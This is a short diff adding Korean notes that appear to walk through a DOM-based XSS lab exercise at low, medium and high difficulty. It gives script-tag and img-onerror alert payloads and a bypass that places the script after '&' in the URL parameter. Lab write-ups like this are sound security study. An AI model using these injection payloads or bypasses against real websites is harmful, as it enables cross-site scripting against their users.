@@ -1,0 +1,26 @@
+low
+1. 아무거나 선택
+
+2. url에 선택한게 나오는 것을 확인 후, 스크립트로 변경
+<script>alert(1)</script>
+
+
+medium
+1. 아무거나 선택
+
+2. url에 스크립트 넣어봤지만 기본으로 선택이 됨
+<script>alert(1)</script>
+
+3. 스크립트가 안되어 이미지 태그 사용
+<img src=as.png onerror=alert(1)>
+
+
+high
+1. 아무거나 선택
+
+2. url에 스크립트, 이미지 태그 사용, 둘 다 기본으론 선택 됨
+<script>alert(1)</script>
+<img src=as.png onerror=alert(1)>
+
+3. 코드를 보니 스위치를 사용했어서, &후 스크립트 삽입
+<script>alert(1)</script>
